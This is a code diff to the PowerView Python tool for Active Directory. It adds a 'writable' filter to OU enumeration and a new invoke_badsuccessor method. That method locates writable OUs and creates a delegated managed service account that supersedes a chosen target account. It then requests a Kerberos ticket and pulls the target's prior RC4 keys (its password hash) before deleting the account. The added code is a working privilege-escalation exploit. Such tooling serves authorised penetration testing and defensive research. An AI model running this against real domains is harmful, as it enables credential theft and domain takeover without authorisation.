@@ -19,6 +19,7 @@ from powerview.modules.exchange import ExchangeEnum
 from powerview.utils.helpers import *
 from powerview.utils.connections import CONNECTION
 from powerview.utils.storage import Storage
+from powerview.utils.accesscontrol import AccessControl
 from powerview.modules.ldapattack import (
 	LDAPAttack,
 	ACLEnum,
@@ -810,8 +811,7 @@ class PowerView:
 		else:
 			targetobject_dn = targetobject["attributes"]["distinguishedName"]
 
-		logging.info(f"[Remove-DomainObject] Found {targetobject_dn} in domain")
-		
+		logging.debug(f"[Remove-DomainObject] Found {targetobject_dn} in domain")
 		logging.warning(f"[Remove-DomainObject] Removing object from domain")
 		
 		succeeded = self.ldap_session.delete(targetobject_dn)
@@ -872,7 +872,7 @@ class PowerView:
 
 		return objects
 
-	def get_domainou(self, args=None, properties=[], identity=None, searchbase=None, resolve_gplink=False, search_scope=ldap3.SUBTREE, no_cache=False, no_vuln_check=False, raw=False):
+	def get_domainou(self, args=None, properties=[], identity=None, searchbase=None, resolve_gplink=False, search_scope=ldap3.SUBTREE, sd_flag=None, writable=False, no_cache=False, no_vuln_check=False, raw=False):
 		def_prop = [
 			'objectClass',
 			'ou',
@@ -889,6 +889,7 @@ class PowerView:
 			'dSCorePropagationData'
 		]
 		identity = args.identity if hasattr(args, 'identity') and args.identity else identity
+		writable = args.writable if hasattr(args, 'writable') and args.writable else writable
 		properties = args.properties if hasattr(args, 'properties') and args.properties else properties
 		properties = set(properties or def_prop)
 		searchbase = args.searchbase if hasattr(args, 'searchbase') and args.searchbase else searchbase
@@ -898,6 +899,63 @@ class PowerView:
 
 		if identity:
 			identity_filter += f"(|(name={identity})(distinguishedName={identity}))"
+
+		if writable:
+			exclude_list = [
+				"S-1-5-32-544",
+				"S-1-5-18",
+				"S-1-5-32-548",
+				"S-1-5-32-550",
+			]
+			exclude_rids = [
+				"-512",
+				"-519",
+				"-520",
+				"-521",
+			]
+			relevant_rights = {
+				"CreateChild": 0x00000001,
+				"GenericAll": 0x10000000,
+				"WriteDACL": 0x00040000,
+				"WriteOwner": 0x00080000
+			}
+			relevant_object_types = {
+				"00000000-0000-0000-0000-000000000000": "All Objects",
+				"0feb936f-47b3-49f2-9386-1dedc2c23765": "msDS-DelegatedManagedServiceAccount",
+			}
+
+			properties.add('ntSecurityDescriptor')
+			sd_flag = 0x07
+
+			username = self.whoami.split('\\')[1] if "\\" in self.whoami else self.whoami
+			entries = self.get_domainobject(ldap_filter=f"(sAMAccountName={username})", properties=['objectSid', 'memberOf'])
+			if len(entries) == 0:
+				logging.error(f"[Add-DomainCATemplateAcl] Current user {username} not found")
+				return False
+			elif len(entries) > 1:
+				logging.error(f"[Add-DomainCATemplateAcl] More than one current user {username} found")
+				return False
+
+			current_user_sid = entries[0].get("attributes", {}).get("objectSid")
+			if current_user_sid in exclude_list:
+				exclude_list.remove(current_user_sid)
+			current_user_rid = f"-{current_user_sid.split('-')[-1]}"
+			if current_user_rid in exclude_rids:
+				exclude_rids.remove(current_user_rid)
+
+			member_of = entries[0].get("attributes", {}).get("memberOf", [])
+			if isinstance(member_of, str):
+				member_of = [member_of]
+			
+			for group in member_of:
+				group_entries = self.get_domainobject(ldap_filter=f"(distinguishedName={group})", properties=['objectSid'])
+				for group_entry in group_entries:
+					group_sid = group_entry.get("attributes", {}).get("objectSid")
+					if group_sid in exclude_list:
+						exclude_list.remove(group_sid)
+					group_rid = f"-{group_sid.split('-')[-1]}"
+					if group_rid in exclude_rids:
+						exclude_rids.remove(group_rid)
 
 		no_cache = args.no_cache if hasattr(args, 'no_cache') and args.no_cache else no_cache
 		no_vuln_check = args.no_vuln_check if hasattr(args, 'no_vuln_check') and args.no_vuln_check else no_vuln_check
@@ -915,6 +973,9 @@ class PowerView:
 
 		ldap_filter = f'(&(objectCategory=organizationalUnit){identity_filter}{ldap_filter})'
 		logging.debug(f'[Get-DomainOU] LDAP search filter: {ldap_filter}')
+		
+		controls = security_descriptor_control(sdflags=sd_flag) if sd_flag is not None else None
+		
 		entries = self.ldap_session.extend.standard.paged_search(
 			searchbase,
 			ldap_filter,
@@ -922,12 +983,46 @@ class PowerView:
 			paged_size = 1000,
 			generator=True,
 			search_scope=search_scope,
+			controls=controls,
 			no_cache=no_cache,
 			no_vuln_check=no_vuln_check,
 			raw=raw
 		)
 
+		writable_entries = []
 		for entry in entries:
+			is_writable = False
+			if writable:
+				logging.debug(f"[Get-DomainOU] Checking if {entry.get('attributes', {}).get('distinguishedName', None)} is writable")
+				if 'nTSecurityDescriptor' not in list(entry['attributes'].keys()):
+					continue
+
+				sd_data = entry.get('attributes', {}).get('nTSecurityDescriptor', None)
+				if not sd_data:
+					continue
+
+				sd_parser = AccessControl.parse_sd(sd_data, raw=True)
+				for ace in sd_parser['Dacl']:
+					trustee = ace['trustee']
+					permissions = ace['permissions']
+					if trustee in exclude_list:
+						continue
+					skip_trustee = False
+					for rid in exclude_rids:
+						if trustee.endswith(rid):
+							skip_trustee = True
+							break
+					if skip_trustee:
+						continue
+					has_relevant_right = any(permissions & right_value for right_value in relevant_rights.values())
+					if not has_relevant_right:
+						continue
+					is_writable = True
+					break
+
+				if "attributes" in entry:
+					entry["attributes"].pop("nTSecurityDescriptor", None)
+
 			if resolve_gplink:
 				if len(entry['attributes']['gPLink']) == 0:
 					continue
@@ -945,7 +1040,14 @@ class PowerView:
 					
 					if len(gplink_list) != 0:
 						entry["attributes"]["gPLink"] = gplink_list
-		return entries
+
+			if writable:
+				if is_writable:
+					writable_entries.append(entry)
+			else:
+				writable_entries.append(entry)
+
+		return writable_entries
 
 	def get_domainobjectacl(self, identity=None, security_identifier=None, ldapfilter=None, resolveguids=False, guids_map_dict=None, searchbase=None, args=None, search_scope=ldap3.SUBTREE, no_cache=False, no_vuln_check=False, raw=False):
 		if args:
@@ -1282,7 +1384,7 @@ class PowerView:
 				'sAMAccountName': f"{identity}$" if not identity.endswith('$') else identity,
 				'cn': identity,
 				'userAccountControl': 0x1000,  # WORKSTATION_TRUST_ACCOUNT
-				'dNSHostName': f"{identity}.{self.domain}",
+				'dNSHostName': f"{identity}.{self.conn.domain}",
 				'msDS-ManagedPasswordInterval': 30,
 				'msDS-SupportedEncryptionTypes': 28, # RC4-HMAC,AES128,AES256
 			}
@@ -4218,18 +4320,13 @@ displayName=New Group Policy Object
 		try:
 			dmsa_attrs = {
 				'objectClass': [
-					'top',
-					'person',
-					'organizationalPerson',
-					'user',
-					'computer',
 					'msDS-DelegatedManagedServiceAccount'
 				],
 				'objectCategory': f'CN=ms-DS-Delegated-Managed-Service-Account,{self.schema_dn}',
 				'sAMAccountName': f"{identity}$" if not identity.endswith('$') else identity,
 				'cn': identity,
-				'userAccountControl': 0x1000,  # WORKSTATION_TRUST_ACCOUNT
-				'dNSHostName': f"{identity}.{self.domain}",
+				'userAccountControl': 4096,  # WORKSTATION_TRUST_ACCOUNT
+				'dNSHostName': f"{identity}.{self.conn.domain}",
 				'msDS-SupportedEncryptionTypes': 28, # RC4-HMAC,AES128,AES256
 				'msDS-ManagedPasswordInterval': 30,
 				'msDS-DelegatedMSAState': DMSA_DELEGATED_MSA_STATE.DISABLED.value
@@ -6052,6 +6149,112 @@ displayName=New Group Policy Object
 		else:
 			logging.error(f"[Invoke-MessageBox] Failed to send message to session {session_id} on {identity}")
 		return success
+
+	def invoke_badsuccessor(self, identity=None, dmsaname=None, principalallowed=None, targetidentity=None, basedn=None, nocache=False, args=None):
+		if args:
+			if dmsaname is None and hasattr(args, 'dmsaname') and args.dmsaname:
+				dmsaname = args.dmsaname
+			if principalallowed is None and hasattr(args, 'principalallowed') and args.principalallowed:
+				principalallowed = args.principalallowed
+			if targetidentity is None and hasattr(args, 'targetidentity') and args.targetidentity:
+				targetidentity = args.targetidentity
+			if basedn is None and hasattr(args, 'basedn') and args.basedn:
+				basedn = args.basedn
+			if hasattr(args, 'nocache'):
+				nocache = args.nocache
+		
+		if not dmsaname:
+			dmsaname = get_random_name(service_account=True)
+		if not principalallowed:
+			principalallowed = self.conn.username
+
+		# get writable ou
+		if not basedn:
+			logging.info(f"[Invoke-BadSuccessor] No basedn provided. Searching for writable OU in {self.root_dn}...")
+			writable_ous = self.get_domainou(
+				properties = ['distinguishedName'],
+				writable=True,
+				no_cache=nocache
+			)
+			if len(writable_ous) == 0:
+				logging.error(f"[Invoke-BadSuccessor] No writable OU found. Using base DN {self.root_dn}")
+				basedn = self.root_dn
+			elif len(writable_ous) > 1:
+				c_key = 0
+				logging.info('[Invoke-BadSuccessor] We have more than one writable OU. Please choose one that is reachable')
+				cnt = 0
+				for ou in writable_ous:
+					print(f"{cnt}: {ou['attributes']['distinguishedName']}")
+					cnt += 1
+				while True:
+					try:
+						c_key = int(input(">>> Your choice: "))
+						if c_key in range(len(writable_ous)):
+							break
+					except Exception:
+						pass
+				basedn = writable_ous[c_key]['attributes']['distinguishedName']
+			else:
+				basedn = writable_ous[0]['attributes']['distinguishedName']
+
+		#add dmsa account
+		try:
+			succeed = self.add_domaindmsa(identity=dmsaname, supersededaccount=targetidentity, principals_allowed_to_retrieve_managed_password=principalallowed, basedn=basedn)
+			if not succeed:
+				logging.error(f"[Invoke-BadSuccessor] Failed to add DMSA account {dmsaname}")
+				return
+		except Exception as e:
+			if str(e).find("invalid object class msDS-DelegatedManagedServiceAccount") >= 0:
+				logging.error(f"[Invoke-BadSuccessor] {str(e)}. Check if DC supports DMSA Account (Windows Server 2025+)")
+			else:
+				logging.error(f"[Invoke-BadSuccessor] {str(e)}")
+			return
+
+		entries = []
+		# request service ticket for dmsaname
+		from impacket.krb5.types import Principal
+		from impacket.krb5 import constants
+		from impacket.krb5.kerberosv5 import getKerberosTGT
+		from binascii import unhexlify
+
+		tgt = self.conn.get_TGT()
+		if not tgt:
+			userName = Principal(self.conn.username, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
+			tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(userName, self.conn.password, self.conn.domain,
+																unhexlify(self.conn.lmhash), unhexlify(self.conn.nthash), self.conn.auth_aes_key,
+																self.conn.kdcHost)
+
+		tgs, rcipher, oldSessionKey, sessionKey, previous_keys = MSA.request_dmsa_st(tgt, cipher, oldSessionKey, sessionKey, self.conn.kdcHost, self.conn.domain, dmsaname + '$')
+		if tgs:
+			sessionKey = oldSessionKey
+
+			for key in previous_keys:
+				try:
+					#print("{0}\\{1}:{2}".format(self.conn.domain, targetidentity, key[constants.EncryptionTypes.rc4_hmac]))
+					entries.append(
+						{
+							"attributes": {
+								"Domain": self.conn.domain,
+								"Identity": targetidentity,
+								"Key": key[constants.EncryptionTypes.rc4_hmac]
+							}
+						}
+					)
+					break
+				except:
+					pass
+		else:
+			logging.error(f"[Invoke-BadSuccessor] Failed to request service ticket for {dmsaname}")
+
+		# dmsa_dn = self.get_domaindmsa(identity=dmsaname, properties=['distinguishedName'], searchbase=basedn)[0].get('attributes', {}).get('distinguishedName', None)
+		# if not dmsa_dn:
+		# 	logging.error(f"[Invoke-BadSuccessor] Failed to get DMSA account {dmsaname}")
+		# 	return
+		# self.ldap_session.modify(dmsa_dn, {'msDS-ManagedAccountPrecededByLink': [(ldap3.MODIFY_REPLACE, ["CN=DC01,OU=Domain Controllers,DC=range,DC=local"])]})
+
+		# cleanup, remove dmsa account
+		self.remove_domaindmsa(identity=dmsaname, searchbase=basedn)
+		return entries
 
 	def get_netterminalsession(self, identity=None, username=None, password=None, domain=None, lmhash=None, nthash=None, port=445, args=None):
 		if args:
